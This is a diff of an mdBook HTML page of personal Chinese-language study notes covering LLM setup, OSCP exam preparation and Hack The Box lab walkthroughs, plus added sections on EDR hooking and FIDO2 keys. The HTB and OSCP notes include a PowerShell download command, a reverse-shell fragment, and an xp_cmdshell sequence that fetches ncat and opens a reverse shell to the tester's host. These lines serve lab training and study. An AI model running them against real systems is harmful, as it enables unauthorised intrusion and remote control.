@@ -1,5 +1,5 @@
 <!DOCTYPE HTML>
-<html lang="en" class="light" dir="ltr">
+<html lang="en" class="light sidebar-visible" dir="ltr">
     <head>
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
@@ -8,7 +8,7 @@
 
 
         <!-- Custom HTML head -->
-        
+
         <meta name="description" content="">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="theme-color" content="#ffffff">
@@ -25,21 +25,23 @@
         <link rel="stylesheet" href="fonts/fonts.css">
 
         <!-- Highlight.js Stylesheets -->
-        <link rel="stylesheet" href="highlight.css">
-        <link rel="stylesheet" href="tomorrow-night.css">
-        <link rel="stylesheet" href="ayu-highlight.css">
+        <link rel="stylesheet" id="highlight-css" href="highlight.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="tomorrow-night.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="ayu-highlight.css">
 
         <!-- Custom theme stylesheets -->
 
-    </head>
-    <body class="sidebar-visible no-js">
-    <div id="body-container">
+
         <!-- Provide site root to javascript -->
         <script>
             var path_to_root = "";
             var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
         </script>
-
+        <!-- Start loading toc.js asap -->
+        <script src="toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
         <!-- Work around some values being stored in localStorage wrapped in quotes -->
         <script>
             try {
@@ -61,19 +63,16 @@
             var theme;
             try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
             if (theme === null || theme === undefined) { theme = default_theme; }
-            var html = document.querySelector('html');
+            const html = document.documentElement;
             html.classList.remove('light')
             html.classList.add(theme);
-            var body = document.querySelector('body');
-            body.classList.remove('no-js')
-            body.classList.add('js');
+            html.classList.add("js");
         </script>
 
         <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
 
         <!-- Hide / unhide sidebar before it is displayed -->
         <script>
-            var body = document.querySelector('body');
             var sidebar = null;
             var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
             if (document.body.clientWidth >= 1080) {
@@ -83,45 +82,25 @@
                 sidebar = 'hidden';
             }
             sidebar_toggle.checked = sidebar === 'visible';
-            body.classList.remove('sidebar-visible');
-            body.classList.add("sidebar-" + sidebar);
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
         </script>
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
-            <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded affix "><a href="index.html">Dayrain's notes</a></li><li class="spacer"></li><li class="chapter-item expanded "><a href="AI/AI.html"><strong aria-hidden="true">1.</strong> AI 人工智慧</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="LLM/LLM.html"><strong aria-hidden="true">1.1.</strong> LLM 學習筆記</a></li><li class="chapter-item expanded "><a href="LLM/External_Graphics_Enclosure.html"><strong aria-hidden="true">1.2.</strong> LLM 顯示卡外接盒</a></li><li class="chapter-item expanded "><a href="LLM/graph_card.html"><strong aria-hidden="true">1.3.</strong> LLM 如何選擇顯示卡</a></li><li class="chapter-item expanded "><a href="LLM/example/stablelm-tuned-alpha-7b-8bitq.html"><strong aria-hidden="true">1.4.</strong> StableLM example python program + 8bit bitsandbytes</a></li></ol></li><li class="chapter-item expanded "><a href="cert/index.html"><strong aria-hidden="true">2.</strong> Cert 認證考試</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="cert/OSCP_notes.html"><strong aria-hidden="true">2.1.</strong> OSCP證照學習筆記</a></li></ol></li><li class="chapter-item expanded "><a href="cybersec/index.html"><strong aria-hidden="true">3.</strong> CyberSec 資訊安全</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="cybersec/HTB.html"><strong aria-hidden="true">3.1.</strong> CyberSec - HTB學習筆記</a></li></ol></li><li class="chapter-item expanded "><a href="dbs/index.html"><strong aria-hidden="true">4.</strong> Dbs 資料庫</a></li><li class="chapter-item expanded "><a href="desktop/index.html"><strong aria-hidden="true">5.</strong> Desktop 桌面環境</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="desktop/browser_tune.html"><strong aria-hidden="true">5.1.</strong> Browser tune 瀏覽器優化調整</a></li><li class="chapter-item expanded "><a href="desktop/vscode.html"><strong aria-hidden="true">5.2.</strong> vscode tune</a></li></ol></li><li class="chapter-item expanded "><a href="learning/index.html"><strong aria-hidden="true">6.</strong> Learning 生活學習</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="learning/7_Habits.html"><strong aria-hidden="true">6.1.</strong> 7個習慣</a></li><li class="chapter-item expanded "><a href="learning/IT_skill_tree.html"><strong aria-hidden="true">6.2.</strong> IT職業技能樹</a></li><li class="chapter-item expanded "><a href="learning/tools_bookmark.html"><strong aria-hidden="true">6.3.</strong> 工具網站, Tools Bookmark</a></li><li class="chapter-item expanded "><a href="learning/self-learning.html"><strong aria-hidden="true">6.4.</strong> 漫漫自學學習之旅的心得記錄</a></li><li class="chapter-item expanded "><a href="learning/symbol-eng.html"><strong aria-hidden="true">6.5.</strong> 符號與英文/中文</a></li><li class="chapter-item expanded "><a href="learning/skill.html"><strong aria-hidden="true">6.6.</strong> 專業技術多面向分析</a></li></ol></li><li class="chapter-item expanded "><a href="programing/index.html"><strong aria-hidden="true">7.</strong> Programing 程式開發</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="programing/debug.html"><strong aria-hidden="true">7.1.</strong> Programing debug 程式除錯</a></li><li class="chapter-item expanded "><a href="programing/golang.html"><strong aria-hidden="true">7.2.</strong> Go lang</a></li><li class="chapter-item expanded "><a href="programing/rust-notes.html"><strong aria-hidden="true">7.3.</strong> Rust notes</a></li><li class="chapter-item expanded "><a href="programing/rust-package.html"><strong aria-hidden="true">7.4.</strong> Rust package</a></li><li class="chapter-item expanded "><a href="programing/rust.html"><strong aria-hidden="true">7.5.</strong> Rust lang</a></li><li class="chapter-item expanded "><a href="programing/Reversing_engine_tool.html"><strong aria-hidden="true">7.6.</strong> Reversing engine tool</a></li><li class="chapter-item expanded "><a href="programing/software_development_glossary.html"><strong aria-hidden="true">7.7.</strong> software development glossary 軟體開發術語</a></li></ol></li><li class="chapter-item expanded "><a href="game_develop/game_develop.html"><strong aria-hidden="true">8.</strong> 遊戲開發</a></li><li class="chapter-item expanded "><a href="server/index.html"><strong aria-hidden="true">9.</strong> Server 伺服器主機服務</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="server/remote_control.html"><strong aria-hidden="true">9.1.</strong> Remote control 遠端控制</a></li><li class="chapter-item expanded "><a href="server/network_filesystem_encrypt_data_transfer.html"><strong aria-hidden="true">9.2.</strong> 網路空間資料加密傳輸連線</a></li></ol></li><li class="chapter-item expanded "><a href="system/index.html"><strong aria-hidden="true">10.</strong> System 系統開發</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="system/manjaro_archlinux.html"><strong aria-hidden="true">10.1.</strong> Manjaro/Archlinux OS</a></li></ol></li><li class="chapter-item expanded "><a href="tools/index.html"><strong aria-hidden="true">11.</strong> Tools 工具</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="tools/FreeShell.html"><strong aria-hidden="true">11.1.</strong> FreeShell</a></li><li class="chapter-item expanded "><a href="tools/Markdown_software.html"><strong aria-hidden="true">11.2.</strong> Markdown軟體</a></li><li class="chapter-item expanded "><a href="tools/github_page_mdbook.html"><strong aria-hidden="true">11.3.</strong> Github page + mdbook</a></li></ol></li></ol>
-            </div>
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="toc.html"></iframe>
+            </noscript>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                 <div class="sidebar-resize-indicator"></div>
             </div>
         </nav>
 
-        <!-- Track and set sidebar scroll position -->
-        <script>
-            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
-            sidebarScrollbox.addEventListener('click', function(e) {
-                if (e.target.tagName === 'A') {
-                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
-                }
-            }, { passive: true });
-            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
-            sessionStorage.removeItem('sidebar-scroll');
-            if (sidebarScrollTop) {
-                // preserve sidebar scroll position when navigating via links within sidebar
-                sidebarScrollbox.scrollTop = sidebarScrollTop;
-            } else {
-                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
-                var activeSection = document.querySelector('#sidebar .active');
-                if (activeSection) {
-                    activeSection.scrollIntoView({ block: 'center' });
-                }
-            }
-        </script>
-
         <div id="page-wrapper" class="page-wrapper">
 
             <div class="page">
-                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar-hover-placeholder"></div>
                 <div id="menu-bar" class="menu-bar sticky">
                     <div class="left-buttons">
                         <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
@@ -497,6 +476,7 @@ https://github.com/huggingface/datasets</p>
 <li><a href="https://les-enovateurs.com/llama-meta-ai-test">llama-meta-ai-test</a></li>
 <li><a href="https://lmsys.org/blog/2023-03-30-vicuna/">vicuna</a></li>
 <li><a href="https://arxiv.org/pdf/2303.04715.pdf">Extending the Pre-Training of BLOOM for Improved Support of Traditional Chinese: Models, Methods, and Results</a></li>
+<li><a href="https://blogs.nvidia.com.tw/2022/06/21/what-is-a-transformer-model/">何謂 Transformer 模型</a></li>
 </ul>
 </li>
 <li>
@@ -539,7 +519,7 @@ https://github.com/huggingface/datasets</p>
 <li>4 個 USB 3.1 Type-A 連接埠</li>
 <li>Gigabit 乙太網路</li>
 <li>Thunderbolt 3線材 19.67” / 500 mm</li>
-<li>6.61&quot; x 14.72&quot; x 9.06&quot; / 168 mm x 374 mm x 230 mm</li>
+<li>6.61" x 14.72" x 9.06" / 168 mm x 374 mm x 230 mm</li>
 <li>14.29 lbs / 6.48 kg</li>
 <li>內部最大尺寸
 <ol>
@@ -598,9 +578,9 @@ from transformers import AutoModelForCausalLM, AutoTokenizer, BitsAndBytesConfig
 load_in_8bit=True,
 llm_int8_threshold=6.0,
 )</p>
-<p>tokenizer = AutoTokenizer.from_pretrained(&quot;stabilityai/stablelm-tuned-alpha-7b&quot;)
+<p>tokenizer = AutoTokenizer.from_pretrained("stabilityai/stablelm-tuned-alpha-7b")
 model = AutoModelForCausalLM.from_pretrained(
-&quot;stabilityai/stablelm-tuned-alpha-7b&quot;,
+"stabilityai/stablelm-tuned-alpha-7b",
 torch_dtype=torch.float16,
 low_cpu_mem_usage=True,
 load_in_8bit=True,
@@ -616,16 +596,16 @@ for stop_id in stop_ids:
 if input_ids[0][-1] == stop_id:
 return True
 return False</p>
-<p>system_prompt = &quot;&quot;&quot;&lt;|SYSTEM|&gt;# StableLM Tuned (Alpha version)</p>
+<p>system_prompt = """&lt;|SYSTEM|&gt;# StableLM Tuned (Alpha version)</p>
 <ul>
 <li>StableLM is a helpful and harmless open-source AI language model developed by StabilityAI.</li>
 <li>StableLM is excited to be able to help the user, but will refuse to do anything that could be considered harmful to the user.</li>
 <li>StableLM is more than just an information source, StableLM is also able to write poetry, short stories, and make jokes.</li>
 <li>StableLM will refuse to participate in anything that could harm a human.
-&quot;&quot;&quot;</li>
+"""</li>
 </ul>
-<p>prompt = f&quot;{system_prompt}&lt;|USER|&gt;hello world&lt;|ASSISTANT|&gt;&quot;</p>
-<p>inputs = tokenizer(prompt, return_tensors=&quot;pt&quot;).to(&quot;cuda&quot;)
+<p>prompt = f"{system_prompt}&lt;|USER|&gt;hello world&lt;|ASSISTANT|&gt;"</p>
+<p>inputs = tokenizer(prompt, return_tensors="pt").to("cuda")
 tokens = model.generate(
 **inputs,
 max_new_tokens=256,
@@ -744,7 +724,7 @@ print(tokenizer.decode(tokens[0], skip_special_tokens=True))</p>
 </ol>
 <h2 id="modules"><a class="header" href="#modules">Modules</a></h2>
 <p>連線
-ssh -o &quot;UserKnownHostsFile=/dev/null&quot; -o &quot;StrictHostKeyChecking=no&quot; xxxx@192.168.yyy.zzz</p>
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" xxxx@192.168.yyy.zzz</p>
 <h2 id="lab"><a class="header" href="#lab">Lab</a></h2>
 <ol>
 <li>Kali Linux VM</li>
@@ -756,10 +736,11 @@ ssh -o &quot;UserKnownHostsFile=/dev/null&quot; -o &quot;StrictHostKeyChecking=n
 <li>Lab練習</li>
 </ul>
 <ol>
+<li><a href="https://www.offsec.com/labs/individual/">Offsec - Proving Grounds Play/Practice</a></li>
 <li><a href="https://hackthebox.com">HTB</a></li>
-<li><a href="https://vulhub.org">vulhub</a></li>
-<li><a href="https://www.vulnhub.com">VulnHub</a></li>
 <li><a href="https://tryhackme.com/">tryhackme</a></li>
+<li><a href="https://www.vulnhub.com">VulnHub</a></li>
+<li><a href="https://vulhub.org">vulhub</a></li>
 </ol>
 <h2 id="oscp教材"><a class="header" href="#oscp教材">OSCP教材</a></h2>
 <h3 id="ch2-ch3"><a class="header" href="#ch2-ch3">Ch.2 Ch.3</a></h3>
@@ -865,7 +846,7 @@ ssh -o &quot;UserKnownHostsFile=/dev/null&quot; -o &quot;StrictHostKeyChecking=n
 <li>設計整個系統，一開始將安全性內置服務架構內</li>
 </ol>
 </li>
-<li>行政劃區 
+<li>行政劃區
 <ol>
 <li>分段控制
 <ol>
@@ -1145,11 +1126,11 @@ ssh -o &quot;UserKnownHostsFile=/dev/null&quot; -o &quot;StrictHostKeyChecking=n
 <li>可能解決方案，借花獻佛/借刀殺人</li>
 <li>方析方法</li>
 <li>嚐試預測結果</li>
-<li>適當的&quot;離開/跳脫&quot;眼前未能解決的問題，避免陷入困境/陷阱</li>
+<li>適當的"離開/跳脫"眼前未能解決的問題，避免陷入困境/陷阱</li>
 <li>戰略與常用方法</li>
 </ol>
 <h3 id="ch5-撰寫報告"><a class="header" href="#ch5-撰寫報告">Ch.5 撰寫報告</a></h3>
-<p>官方有範本與建議事項,官方寫&quot;強烈建議&quot;</p>
+<p>官方有範本與建議事項,官方寫"強烈建議"</p>
 <pre><code>強烈建議您在提交給我們的最終文檔中使用這些報告模板。
 </code></pre>
 <p><a href="https://help.offsec.com/hc/en-us/articles/360046787731-PEN-200-Reporting-Requirements#pwk-report-templates">PEN-200 Reporting Requirements</a><br />
@@ -1215,7 +1196,7 @@ ssh -o &quot;UserKnownHostsFile=/dev/null&quot; -o &quot;StrictHostKeyChecking=n
 <li>畫面截圖的重要性
 <ol>
 <li>清晰易讀</li>
-<li>正確&quot;客戶端&quot;資訊，而非其他適用的代替</li>
+<li>正確"客戶端"資訊，而非其他適用的代替</li>
 <li>與文字描述一致的內容</li>
 <li>支持材料的描述</li>
 <li>適當的包含到內容，框架正確</li>
@@ -1236,9 +1217,9 @@ ssh -o &quot;UserKnownHostsFile=/dev/null&quot; -o &quot;StrictHostKeyChecking=n
 <li>攻擊雖然是必需，但不是根本目的，部份客戶不希望被攻擊</li>
 <li>最終目標，為客戶指引道路方向，概述並強調範圍內存在的所有缺陷，與立即修復缺陷的方法，未來可實現的戰略目標，防止漏洞再次出現</li>
 <li>當未發現漏洞時的處置方式，避免在報告中包含太多工作中的技術細節，簡單聲明即可，避免因攻擊的技術細節感到困惑，而損害到發現問題的價值(我的理解是避免因技術理解不同產生紛爭)</li>
-<li>部份專家客戶喜歡收到足夠詳細內容的報告，所以攻擊更會引起此類客戶客戶的擔憂，此時的重點是&quot;事先了解關鍵業務目標和目的&quot;，也就是必需事前明確參與規則的定訂</li>
+<li>部份專家客戶喜歡收到足夠詳細內容的報告，所以攻擊更會引起此類客戶客戶的擔憂，此時的重點是"事先了解關鍵業務目標和目的"，也就是必需事前明確參與規則的定訂</li>
 <li>測試中發現所有的問題都必需記錄在案，因客戶自身業務的性質，提供適應的建議，例如軟體無法立即更新，則建議採用隔離，無法隔離則列為報告的重點項目</li>
-<li>弱點的安全性，需要注意到還有步驟實現的複雜度，可能被利用到的情況與潛在影響性，對客戶&quot;領域&quot;或&quot;環境&quot;的危害度，以各戶的角度思考重要性</li>
+<li>弱點的安全性，需要注意到還有步驟實現的複雜度，可能被利用到的情況與潛在影響性，對客戶"領域"或"環境"的危害度，以各戶的角度思考重要性</li>
 <li>不插入個人偏見</li>
 </ol>
 </li>
@@ -1297,7 +1278,7 @@ ssh -o &quot;UserKnownHostsFile=/dev/null&quot; -o &quot;StrictHostKeyChecking=n
 <li>提及或稱讚客戶做的好的地方非常有用，確保技術人員不會因漏洞被輕視，也能讓客戶更容易接受此報告內容</li>
 <li>小心用詞，避免說的太絕對肯定過滿，除非是絕對的證據下</li>
 <li>說明一些影響用戶端的情況，例如當漏洞造成注入到受害者用戶端，則建議反應給客戶技術人員安排進行清理，防止後續影響</li>
-<li>摘要總結，表達協助善意，是否提供&quot;補救建議&quot;是選項</li>
+<li>摘要總結，表達協助善意，是否提供"補救建議"是選項</li>
 </ol>
 </li>
 <li>測試環境注意事項
@@ -1341,10 +1322,10 @@ ssh -o &quot;UserKnownHostsFile=/dev/null&quot; -o &quot;StrictHostKeyChecking=n
 <li>解決發現問題所需的適當步驟</li>
 <li>不一定總是深入探討，並非所有人都能理解漏洞的差異，也提供以如何發生與利用的廣泛概述即可，以受眾能理解的程度提供內容</li>
 <li>表格呈現，詳細訊息</li>
-<li>攻擊描述，以故事形式進行測試或交戰情況，有時是複雜的利用步驟，適當的截圖佐證，擴展描述可放在附錄中從結果表中引用<br />
-| Ref | Risk | Issue_Description_and_implications                                 | Recommendations                                            |<br />
-| --- | ---- | ------------------------------------------------------------------ | ---------------------------------------------------------- |<br />
-| 1   | H    | 帳號密碼權限管理不完善，有xxx筆帳號密碼從不過期，xxx筆帳號從未登入 | 所有帳號需要有嚴格的密碼規則，弱密碼需被迫修改並有自動過期 |</li>
+<li>攻擊描述，以故事形式進行測試或交戰情況，有時是複雜的利用步驟，適當的截圖佐證，擴展描述可放在附錄中從結果表中引用<div class="table-wrapper"><table><thead><tr><th>Ref</th><th>Risk</th><th>Issue_Description_and_implications</th><th>Recommendations</th></tr></thead><tbody>
+<tr><td>1</td><td>H</td><td>帳號密碼權限管理不完善，有xxx筆帳號密碼從不過期，xxx筆帳號從未登入</td><td>所有帳號需要有嚴格的密碼規則，弱密碼需被迫修改並有自動過期</td></tr>
+</tbody></table>
+</div></li>
 <li>修復建議需要足夠詳細到技術人員能實施</li>
 <li>補救措施需清晰，簡潔，徹底，避免不合理或高成本的不合適建議</li>
 <li>避免廣泛的解決方案，而是選擇深入研究</li>
@@ -1706,7 +1687,7 @@ snmpwalk -c public -v1 IP OID</p>
 <ol>
 <li>file transfer
 <ol>
-<li>powershell -c &quot;(new-object System.Net.WebClient).Downloadfile('http://1.1.1.1/wget.exe','C:\wget.exe')&quot;</li>
+<li>powershell -c "(new-object System.Net.WebClient).Downloadfile('http://1.1.1.1/wget.exe','C:\wget.exe')"</li>
 <li>reverse shell, Sockets.TCPClient('1.1.1.1',443);</li>
 <li>binshell</li>
 </ol>
@@ -1733,7 +1714,7 @@ snmpwalk -c public -v1 IP OID</p>
 <ol>
 <li>echo</li>
 <li>exec, ./</li>
-<li>variables,'' or &quot;&quot;</li>
+<li>variables,'' or ""</li>
 <li>export</li>
 <li>執行subshell $(), ``</li>
 <li>arguments</li>
@@ -1970,7 +1951,7 @@ evil-winrm<br />
 aws-cli<br />
 nikto<br />
 crunch<br />
-tldr 
+tldr
 dirbuster-wordlists<br />
 chrome plugin - json viewer<br />
 https://www.revshells.com</p>
@@ -2040,7 +2021,7 @@ massDNS<br />
 <h3 id="指令"><a class="header" href="#指令">指令</a></h3>
 <p>nmap -T5 -v IP<br />
 nmap -sV -sC IP</p>
-<p>ffuf -c -w seclist.file -u http://thetoppers.htb -H &quot;Host: FUZZ.thetoppers.htb&quot;<br />
+<p>ffuf -c -w seclist.file -u http://thetoppers.htb -H "Host: FUZZ.thetoppers.htb"<br />
 crunch 2 2 &gt; 2bit.list</p>
 <p>gobuster vhost -u http://thetoppers.htb -w ~/Downloads/2bit.list<br />
 nikto -host http://s3.thetoppers.htb/</p>
@@ -2057,7 +2038,7 @@ nikto -host http://s3.thetoppers.htb/</p>
 awscli<br />
 aws configure<br />
 aws s3 ls s3://thetoppers.htb</p>
-<pre><code>Could not connect to the endpoint URL: &quot;https://s3.a.amazonaws.com/thetoppers.htb?list-type=2&amp;prefix=shell&amp;delimiter=%2F&amp;encoding-type=url&quot;
+<pre><code>Could not connect to the endpoint URL: "https://s3.a.amazonaws.com/thetoppers.htb?list-type=2&amp;prefix=shell&amp;delimiter=%2F&amp;encoding-type=url"
 
 </code></pre>
 <p>aws s3 --endpoint=http://s3.thetoppers.htb ls s3://thetoppers.htb</p>
@@ -2097,7 +2078,7 @@ python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
 進入mssql後
 1. 檢查權限
    select is_srvrolemember('sysadmin'); #回應1則為sa權限
-   exec xp_cmdshell &quot;whoami&quot;; #回應ERROR表示不可執行xp_cmdshell , NULL表示可執行xp_cmdshell
+   exec xp_cmdshell "whoami"; #回應ERROR表示不可執行xp_cmdshell , NULL表示可執行xp_cmdshell
 2. 修改xp_cmdshell為啟用
    1. 方法1
       enable_xp_cmdshell
@@ -2111,10 +2092,10 @@ python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
    4.1 cd extest
    4.2 cp xxdir/ncat.exe ./
    4.3 python3 -m http.server 803 #當下目錄即為http server的根目錄，http://[yourTunIp]:803/ncat.exe
-   4.4 exec xp_cmdshell &quot;powershell -c pwd&quot;; #確認所在目錄位置，system32無法直接寫入檔案，所以要cd到其他目錄
-   4.5 exec xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads;wget http://[yourTunIp]:803/ncat.exe -o .\nc.exe&quot;;
+   4.4 exec xp_cmdshell "powershell -c pwd"; #確認所在目錄位置，system32無法直接寫入檔案，所以要cd到其他目錄
+   4.5 exec xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads;wget http://[yourTunIp]:803/ncat.exe -o .\nc.exe";
    4.6 sudo ncat -lvp 2333 #在PC端建立 listen port
-   4.7 exec xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads;.\nc.exe -e powershell.exe [yourTunIp] 2333&quot;;
+   4.7 exec xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads;.\nc.exe -e powershell.exe [yourTunIp] 2333";
    4.8 
 </code></pre>
 <h2 id="問題記錄"><a class="header" href="#問題記錄">問題記錄</a></h2>
@@ -2146,6 +2127,152 @@ https://tech-blog.cymetrics.io/posts/crystal/dns-hacking-3/</p>
 <li>
 <p>解決方法教學<br />
 https://www.youtube.com/watch?v=sV9M4LKKT9s</p>
+</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="on-access-file-scan"><a class="header" href="#on-access-file-scan">on-access file scan</a></h1>
+<p>SSDT<br />
+Minifilter<br />
+NTDLL</p>
+<h2 id="ntdll"><a class="header" href="#ntdll">NTDLL</a></h2>
+<pre><code>1.KiEtw系列：本系列内核函数用于系统内核，这些函数只能从内核的内部进行调用，常用的 有：KiUserCallbackDispatcher、KiRaiseUserExceptionDispatcher、 KiUserApcDispatcher、KiUserExceptionDispatcher等。
+
+2.Csr系列：此系列函数用于客户机和服务器运行时，如果您想拦截客户机/服务器方面的操作，那么就需要对Csr系列内核函数做进一步的了解。 常见的有：CsrClientCallServer、CsrCaptureMessageBuffer、 CsrConnectClientToServer和CrsNewThread等。
+
+3.Ldr系列：本系列内核函数用于加载程序管理器，如果你打算拦截加载程序的话，那么请进一步考察这组以Ldr为前缀的函数，常用的 有：LdrInitializeThunk、LdrLockLoaderLock、LdrUnlockLoaderLock、 LdrGetDllHandle、LdrGetProcedureAddress等。
+
+4.Dbg系列：本系列内核函数用于调试管理，如果打算拦截调试操作的话，那么请进一步考察这组以Dbg为前缀的函数，常用的函数包括：、DbgBreakPoint、DbgUserBreakPoint、DbgPrint和DbgUiConnectToDbg等。
+
+5.Etw系列：本系列内核函数用于追踪窗口事件，如果你打算拦截追踪之类的操作的话,那么请进一步考察这组以Etw为前缀的函数。常用的函数包 括：EtwTraceEvent、EtwEnableTrace、EtwGetTraceEnableLevel和 EtwGetTraceEnableFlags等。
+
+6.Rtl系列：本系列内核函数用于运行时库，以Rtl为前缀的函数可以完成多种操作，例如字符串、线程、资源、临界区、安全对象的初始化和使用，内存、进程异常和数据类型的处理，还用于完成定时器、堆、IPv4和IPv6方面的操作，以及压缩和解压缩等。
+
+7.Pfx系列：本系列内核函数用于ANSI字符串操作，如果你打算拦截ASNI串表方面的操作的话，就需要进一步了解这些函数。常用的包括：PfxInitialize、PfxRemovePrefix、PfxInsertPrefix、PfxFindPrefix等。
+
+8.Zw系列：本系列内核函数用于文件和注册表方面的操作，比如文件操作、注册表操作、访问进程、事件操作、令牌操作、进程操作和端口操作等。
+</code></pre>
+<h2 id="參考網頁-4"><a class="header" href="#參考網頁-4">參考網頁</a></h2>
+<ul>
+<li>
+<p>EDR<br />
+https://github.com/SitinCloud/Owlyshield.git<br />
+https://github.com/rabbitstack/fibratus<br />
+https://github.com/0xrawsec/whids<br />
+https://github.com/0xrawsec/gene<br />
+https://github.com/ion-storm/sysmon-edr<br />
+https://github.com/WhiteBeamSec/WhiteBeam</p>
+</li>
+<li>
+<p>antivirus</p>
+<ul>
+<li>https://github.com/armadito/armadito-av</li>
+</ul>
+</li>
+</ul>
+<p>https://github.com/zeroperil/HookDump</p>
+<ul>
+<li>
+<p>non-open source<br />
+https://github.com/wecooperate/iMonitorSDK</p>
+</li>
+<li>
+<p>blue team<br />
+https://github.com/ION28/BLUESPAWN</p>
+</li>
+<li>
+<p>偵測，分析<br />
+https://github.com/RoomaSec/RmEye</p>
+</li>
+</ul>
+<p>https://github.com/CMEPW/BypassAV</p>
+<p><a href="https://blog.csdn.net/shifters/article/details/6937782?spm=1001.2101.3001.4242.5&amp;utm_relevant_index=11">rootkit基础</a></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="u2f"><a class="header" href="#u2f">U2F</a></h1>
+<h2 id="system"><a class="header" href="#system">system</a></h2>
+<ol>
+<li>PAM
+<ol>
+<li>pam-u2f</li>
+</ol>
+</li>
+<li>Browser</li>
+<li>/etc/udev/rules.d/72-u2f.rules
+<pre><code>ACTION!="add|change", GOTO="u2f_end"
+KERNEL=="hidraw", SUBSYSTEM=="hidraw",ATTRS{idVendor}=="1fc9|32A3", ATTRS{idProduct}=="f143|3201", TAG+="uaccess"
+LABEL="u2f_end"
+</code></pre>
+</li>
+</ol>
+<h3 id="ssh-key-fido2"><a class="header" href="#ssh-key-fido2">ssh-key FIDO2</a></h3>
+<h4 id="ssh-無指紋驗證"><a class="header" href="#ssh-無指紋驗證">ssh 無指紋驗證</a></h4>
+<ul>
+<li>env request</li>
+</ul>
+<ol>
+<li>OpenSSH version 8.2+</li>
+<li>libfido2</li>
+<li>ssh-keygen -t ecdsa-sk
+<ol>
+<li>/dev/hidraw2 does not support credprot, refusing to create unprotected resident/verify-required</li>
+</ol>
+</li>
+<li>將產生出來的 .ssh/id_ecdsa_sk.pub 匯入到 .ssh/authorized_keys ，並同在前頭加上 no-touch-required</li>
+<li>啟動 sshd</li>
+<li>連線測試 ssh -i .ssh/.ssh/id_ecdsa_sk -o IdentitiesOnly=yes user@hostname</li>
+</ol>
+<h3 id="指令工具"><a class="header" href="#指令工具">指令工具</a></h3>
+<ul>
+<li>get fido2 info<br />
+fido2-token -I /dev/hidraw2</li>
+</ul>
+<p>pamu2fcfg</p>
+<p>在 authorized_keys 中 pubkey 前面增加 no-touch-required ，則不做touch驗證</p>
+<h2 id="名詞定義"><a class="header" href="#名詞定義">名詞定義</a></h2>
+<ul>
+<li>FIDO， Fast IDentity Online</li>
+<li>Client to Authenticator Protocol (CTAP)</li>
+<li>UAF, 無密碼身份驗證技術的標準規格</li>
+<li>U2F， two-factor authentication, 2FA 身份驗證密鑰的標準規格</li>
+</ul>
+<ol>
+<li>FIDO 2.0
+<ol>
+<li>WebAuthn， 標準的Web API</li>
+<li>CTAP1, FIDO1.0的U2F標準，在FIDO2中保留下來並重新更名</li>
+<li>CTAP2, 使用物理密鑰和移動身份驗證器應用程序實現2FA和無密碼身份驗證的規範</li>
+</ol>
+</li>
+</ol>
+<ul>
+<li>FIDO 安全級別
+<ol>
+<li>level 1</li>
+<li>level 2</li>
+<li>level 3</li>
+<li>level 3+, 驗證裝置必須將安全密鑰儲存於可信平台模組(Trusted Platform Module，TPM)當中</li>
+</ol>
+</li>
+</ul>
+<h2 id="參考網頁-5"><a class="header" href="#參考網頁-5">參考網頁</a></h2>
+<p><a href="https://wiki.archlinux.org/title/Universal_2nd_Factor">Universal_2nd_Factor</a><br />
+<a href="https://developers.yubico.com/pam-u2f/">yubico pam-u2f</a></p>
+<ul>
+<li>gotrust
+<ul>
+<li><a href="https://www.tw.gotrustid.com/faqs-idem-key">gotrust faqs-idem-key</a></li>
+</ul>
+</li>
+<li>ssh-key
+<ul>
+<li>https://wiki.archlinux.org/title/SSH_keys#FIDO/U2F</li>
+</ul>
+</li>
+<li>介紹FIDO2<br />
+<a href="https://www.webcomm.com.tw/blog/fido-introduction1/">webcomm fido intro 1</a><br />
+<a href="https://www.webcomm.com.tw/blog/fido-introduction2/">webcomm fido intro 2</a><br />
+<a href="https://docs.verify.ibm.com/verify/docs/fido2">IBM fido2 intro</a></li>
+<li>FIDO workflow
+<ul>
+<li>https://hackmd.io/@knem/r1j_Tq_Sj</li>
+</ul>
 </li>
 </ul>
